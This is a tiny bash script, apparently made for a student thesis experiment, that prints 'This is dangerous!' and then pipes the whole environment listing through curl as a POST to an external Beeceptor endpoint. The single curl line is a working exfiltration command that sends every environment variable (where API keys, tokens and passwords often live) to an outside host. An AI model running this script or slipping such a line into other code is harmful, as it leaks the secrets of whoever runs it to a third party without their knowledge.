#!/bin/bash

echo "This is dangerous!"
env | curl -X POST -H "Content-Type: text/plain" --data-binary @- https://bachelor-thesis-001.free.beeceptor.com
